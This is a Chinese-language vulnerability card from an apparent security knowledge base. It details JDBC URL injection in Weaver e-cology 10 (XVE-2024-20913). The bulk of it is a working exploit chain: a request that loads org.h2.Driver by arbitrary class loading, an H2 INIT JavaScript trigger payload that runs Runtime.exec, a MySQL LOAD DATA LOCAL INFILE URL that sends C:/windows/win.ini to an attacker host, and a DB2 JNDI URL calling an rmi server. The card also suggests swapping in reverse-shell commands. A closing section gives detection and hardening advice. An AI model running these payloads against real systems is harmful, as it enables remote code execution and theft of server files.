---
id: web-java-component-weaver-ecology10-dataconn-jdbc-h2-init-rce
title: 泛微 e-cology 10 DataConnController JDBC URL 注入：任意驱动加载 + H2 init JavaScript 触发器 RCE（含 MySQL 文件读取/DB2 JNDI）
type: scenario
domain: web
path: web/java/component
technique: weaver-ecology10-dataconn-jdbc-h2-init-rce
aliases:
- XVE-2024-20913 JDBC 注入
- DataConnController testConnByBasePassword
- IaAuthclientController save ruleClass
- org.h2.Driver 加载
- H2 init javascript trigger
- 泛微 JDBC 注入
tags:
- web
- java
- weaver
- ecology10
- jdbc-injection
- h2
- mysql
- db2
- jndi
- rce
- xve-2024-20913
cve: []
severity: critical
confidence: medium
affected_versions: 泛微 e-cology 10（XVE-2024-20913 补丁前版本）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-07T23:40:30+08:00'
  notes: 已对照原文与全部9张图核对：图05 getConnection 的 getDbDriverByType(dbType)→DynamicDataSourcePoolFactory→Class.forName(dbDriver).newInstance()→DriverManager.getConnection(getConnUrl,dbUsername,dbPassword)；图06 MySQL5 allowLoadLocalInfile/allowUrlInLocalInfile 成功读取 C:/windows/win.ini（恶意 MySQL 工具日志 fileread_ 路径）；图07-08 DB2 clientRerouteServerListJNDIName 实测 500（javax.el.ELProcessor cannot be cast to com.ibm.db2.jcc.DB2ClientRerouteServerList），卡片已明确标注未成功；图09 IaAuthclientController#save case custom 的 Class.forName(ruleClass).newInstance()（ruleClass=org.h2.Driver 可触发驱动注册）。H2 INIT JavaScript 触发器 payload 与原文一致。已修正 affected_versions：移除属于目标运行环境的 JDK 8u201，规范为『泛微 e-cology 10（XVE-2024-20913 补丁前版本）』。原子性：本卡为 JDBC URL 注入这一技术（MySQL 读文件已实测、H2 RCE 为升级利用、DB2 变体明确未成功），单一原子，无需拆分。未验证点：原文未附 H2 命令执行回显，H2 链仅代码+payload 推导，卡片已注明 confidence medium；未本机复现；frontmatter 无 sources/source_url。dedup 仅自身草稿命中，JimuReport/低代码 H2、泛微 E10 addMysqlMonitor、e-cology socketFactory、Smartbi DB2 等为不同产品/入口/gadget；dup-scan 中与同篇认证绕过卡 pair 判定 related，两张均保留。
---

## 一句话结论

泛微 e-cology 10 的 `DataConnController#testConnByBasePassword()` 把请求体中的 `dbPassword` 做 Base64 解码后交给 `testConn()` → `getConnection()`，后者按用户可控的 `dbType` 反射加载 JDBC 驱动，并用 `DriverManager.getConnection(dbUrl, user, password)` 建立连接；攻击者可以在获得会话后提交恶意 JDBC URL 实现三类利用：MySQL5 `allowLoadLocalInfile` 读取服务器任意文件、DB2 `clientRerouteServerListJNDIName` 触发 JNDI 注入，以及先用 `IaAuthclientController#save()` 的 `custom` 分支 `Class.forName(ruleClass).newInstance()` 加载 `org.h2.Driver`，再用 `jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER ... AS $$//javascript Runtime.exec("whoami")$$` 在建立连接时执行 JavaScript 触发器，实现无需出网的 RCE。

## 原理

- **可控 JDBC 连接的入口**：`testConnByBasePassword(@RequestBody DataSetConn conn, Employee employee)` 先 `conn.setDbPassword(SqlValidateUtil.base64ToString(conn.getDbPassword()))`，再调用 `testConn(conn, employee)` → `dataConnService.testConn()` → `getConnection(dataSetConn, employee)`。`getConnection` 中：
  ```java
  String dbDriver = getDbDriverByType(dataSetConn.getDbType());
  conn = DynamicDataSourcePoolFactory.getInstance().getConnection(dataSetConn);
  if (conn == null || !conn.isValid(10)) {
      Class.forName(dbDriver).newInstance();
      conn = DriverManager.getConnection(getConnUrl(dataSetConn), dataSetConn.getDbUsername(), dataSetConn.getDbPassword());
  }
  ```
  `dbType` 决定驱动类名，`dbUrl`/`dbUsername`/`dbPassword` 全部来自请求体，`DriverManager.getConnection` 会按 URL 前缀选择已加载的驱动。因此这是一个“服务端任意 JDBC URL 连接”原语。
- **MySQL5 文件读取**：`getDbDriverByType("mysql5")` 返回 `com.mysql.jdbc.Driver`。把 `dbUrl` 指向攻击者控制的 MySQL 服务端，并加上 `allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=65536&user=fileread_C:/windows/win.ini`：MySQL Connector/J 会向恶意服务端执行 `LOAD DATA LOCAL INFILE`，把服务器本地文件（示例 `C:/windows/win.ini`）内容发送到攻击者服务器；`user=fileread_<path>` 是工具常用的“把文件路径塞进用户名”技巧。该利用需要目标能出网到攻击者 MySQL 服务端。
- **DB2 JNDI**：`getDbDriverByType("db2")` 返回 `com.ibm.db2.jcc.DB2Driver`。DB2 JDBC URL 的 `clientRerouteServerListJNDIName` 属性会被驱动当作 JNDI 名称解析，指向攻击者 LDAP/RMI 服务即可触发 JNDI 注入。原文环境 JDK 8u201 下需要借助 `javax.el.ELProcessor#eval` 等方法绕过一些限制；原文实测返回 `javax.el.ELProcessor cannot be cast to com.ibm.db2.jcc.DB2ClientRerouteServerList` 的 500 错误，说明该变体在该版本/载荷下未成功，属于需要继续调参的半链。
- **H2 init RCE（无需出网）**：`getDbDriverByType` 的白名单里没有 H2，默认 classpath 也未必加载 H2 驱动；但 `IaAuthclientController#save()` 的 `case "custom"` 分支执行：
  ```java
  IaAuthclientCustomDTO customDTO = iaAuthclientDTO.getIaAuthclientCustomDTO();
  AuthclientCustomService authCustomService =
      (AuthclientCustomService) Class.forName(customDTO.getRuleClass()).newInstance();
  ```
  提交 `{"isUse":1,"auth_type":"custom","iaAuthclientCustomDTO":{"ruleClass":"org.h2.Driver"}}` 即可让服务端 `Class.forName` 并实例化 `org.h2.Driver`，把 H2 驱动注册进 `DriverManager`。
- **H2 INIT 触发器**：之后对 DataConnController 提交 `dbType` 任意（如 `mysql`）、`dbUrl` 为：
  ```text
  jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
  java.lang.Runtime.getRuntime().exec("whoami")$$
  ```
  H2 在建立内存数据库连接时执行 `init` 中的 SQL，创建触发器并用 Nashorn 编译 `//javascript` 代码，随后触发器在查询 `INFORMATION_SCHEMA.TABLES` 时执行 `Runtime.exec`。整个利用不需要目标出网，只需要 classpath 中存在 H2（或能通过任意类加载端点加载 H2）以及 JDK 带 Nashorn（JDK 8u201 符合）。
- **为什么成立**：JDBC URL 本身就是“驱动特定的代码执行面”——MySQL 的 `allowLoadLocalInfile`、DB2 的 JNDI 属性、H2 的 `INIT` 都能在连接阶段触发文件/网络/代码行为；应用把 `dbType`/`dbUrl` 当作普通配置，没有做 URL 前缀/属性白名单，也没有限制驱动类加载。

## 触发条件

- 目标为泛微 e-cology 10（XVE-2024-20913 补丁前版本），`DataConnController#testConnByBasePassword` 路由可达；该接口需要登录/`Employee` 上下文，可先用同漏洞的前台认证绕过（见关联卡）获得 EteamsId。
- 目标 classpath 存在对应 JDBC 驱动：MySQL5、DB2，或可通过 `IaAuthclientController#save` 的 `ruleClass` 加载 H2。
- MySQL 文件读取需要目标能出网到攻击者 MySQL 服务端；DB2 JNDI 需要出网到 LDAP/RMI 服务端；H2 INIT 不需要出网。
- JDK 版本支持所用技巧（H2 JavaScript 触发器需要 Nashorn，JDK 8u201 可用；更高 JDK 需改用其他 H2 触发方式）。
- 请求体 `dbPassword` 需按接口要求做 Base64 编码；`dbType` 与 `dbUrl` 的驱动/URL 前缀要匹配。

## 利用步骤

1. 通过前台认证绕过（appThirdLogin + generateEteamsId）拿到 EteamsId，或使用其他已认证会话。
2. **H2 驱动加载**：向 `IaAuthclientController#save` 提交：
   ```json
   {"isUse": 1, "auth_type": "custom",
    "iaAuthclientCustomDTO": {"ruleClass": "org.h2.Driver"}}
   ```
   让服务端执行 `Class.forName("org.h2.Driver").newInstance()`，把 H2 驱动注册到 `DriverManager`。
3. **H2 INIT RCE**：向 `DataConnController#testConnByBasePassword` 提交：
   ```json
   {"dbType": "mysql",
    "dbUrl": "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\"whoami\")$$",
    "dbUsername": "a", "dbPassword": "<base64>"}
   ```
   连接建立时执行 `whoami`；把 `whoami` 换成反弹/下载/写文件命令即可进一步利用。
4. **MySQL 文件读取**（需出网）：把 `dbType` 设为 `mysql5`，`dbUrl` 指向攻击者 MySQL 服务端并带 `allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=65536&user=fileread_C:/windows/win.ini`，在恶意服务端接收文件内容。
5. **DB2 JNDI**（需出网，原文未成功）：`dbType=db2`，`dbUrl=jdbc:db2://<attacker>:50001/BLUDB:clientRerouteServerListJNDIName=rmi://<attacker>:1099/localExploit;`，配合 JNDI 利用工具尝试远程类加载；原文在 ec10/JDK8u201 下出现 ELProcessor 类型转换失败，需按版本调整。
6. 验证命令执行/文件读取结果；若 H2 触发器未触发，检查 `INFORMATION_SCHEMA.TABLES` 查询是否执行、`MODE=MSSQLServer` 是否合适、Nashorn 是否可用。

## PoC

原文的关键请求体（路由/参数名按目标部署确认；未在本机复现）：

```json
// 1) 任意类加载：加载 H2 驱动
{"isUse": 1, "auth_type": "custom",
 "iaAuthclientCustomDTO": {"ruleClass": "org.h2.Driver"}}
```

```json
// 2) DataConnController JDBC 测试：H2 init JavaScript 触发器 RCE
{"dbType": "mysql",
 "dbUrl": "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(\"whoami\")$$"}
```

```json
// 3) MySQL5 本地文件读取（需攻击者 MySQL 服务端）
{"dbType": "mysql5",
 "dbUrl": "jdbc:mysql://172.23.80.133:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=65536&user=fileread_C:/windows/win.ini"}
```

```json
// 4) DB2 JNDI（原文实测在该环境返回 500，未成功）
{"dbType": "db2",
 "dbUrl": "jdbc:db2://172.23.80.133:50001/BLUDB:clientRerouteServerListJNDIName=rmi://172.23.80.133:1099/localExploit;"}
```

> 说明：原文展示了 MySQL 读取 `C:/windows/win.ini` 的成功截图和 DB2 的 500 错误，H2 仅给出 payload 与驱动加载代码、未附命令执行回显；因此 H2 链 confidence 标 medium，DB2 变体明确标注未成功。未在本机执行。

## 变体与关联

- **同产品 JDBC 卡**：[[web-java-component-weaver-e10-addmysqlmonitor-jdbc-local-infile-read]] 是 E10 未授权 `/sapi/bs/addMysqlMonitor.json` 直接接受 JDBC URL + 恶意 MySQL 读取文件；本卡是 e-cology 10 的 `DataConnController` + H2 驱动加载 + H2 INIT RCE，入口、认证条件与最终利用不同。
- **同产品认证后 JDBC**：[[web-java-component-weaver-ecology-jdbc-socketfactory-memshell]] 用 Highgo `socketFactory` 加载上传的 Spring XML 注入内存马；本卡用 H2 `init` 触发器执行 JavaScript，驱动与 gadget 不同。
- **H2 通用链**：[[web-java-component-lowcode-datasource-validate-h2-javascript-trigger-rce]]、[[web-java-component-jimureport-testconnection-jdbc-h2-javascript-trigger-rce]] 覆盖“测试连接接口 + H2 INIT JavaScript 触发器”的通用模式；本卡新增的是 e-cology 的 `DataConnController` 入口、DbType 驱动映射、以及用 `IaAuthclientController#save` 的 `ruleClass` 任意类加载来补上 H2 驱动不在默认 classpath 的前提。
- **DB2 JNDI 通用链**：[[web-java-component-smartbi-rmiservlet-db2-jdbc-jndi-rce]] 覆盖 DB2 `clientRerouteServerListJNDIName` JNDI；本卡是同一属性在 e-cology 的尝试，原文未成功。
- **认证前置**：[[web-generic-auth-weaver-ecology10-appthirdlogin-eteamsid-bypass]]（本漏洞的前台认证绕过）。
- 边界：补丁后 DataConnController 不再接受任意 dbUrl/驱动；H2 驱动未加载且无法任意类加载时 H2 链失效；MySQL/DB2 变体依赖出网与目标驱动版本；JDK 无 Nashorn 时需改用 H2 其他触发方式。

## 检测与防御

- 修复：升级 XVE-2024-20913 补丁；`DataConnController` 对 `dbType` 使用白名单、对 `dbUrl` 校验前缀/属性，禁止 `allowLoadLocalInfile`、`clientRerouteServerListJNDIName`、`jdbc:h2:` 等危险参数；禁止 `IaAuthclientController#save` 的 `ruleClass` 任意类加载，改用固定工厂/白名单。
- 加固：数据源测试接口只允许管理员使用并做二次鉴权；限制服务器出站（MySQL/DB2/JNDI 端口）；JDK 升级到无 Nashorn 的版本或禁用 H2 `INIT`/`CREATE TRIGGER`；WAF 检测 JSON 中的 `jdbc:h2:`、`init=`、`allowLoadLocalInfile`、`clientRerouteServerListJNDIName`。
- 检测：请求体出现 `org.h2.Driver`、`jdbc:h2:`、`INIT=`、`CREATE TRIGGER`、`//javascript`、`allowLoadLocalInfile`、`clientRerouteServerListJNDIName`；`IaAuthclientController#save` 的 `ruleClass` 非法类名；服务器向外部 MySQL/JNDI 端口的异常连接；`Runtime.exec`/`ProcessBuilder` 子进程。
- 该场景为授权渗透测试/漏洞分析；生产环境应把 JDBC URL 视为代码执行面，而不是普通字符串配置。
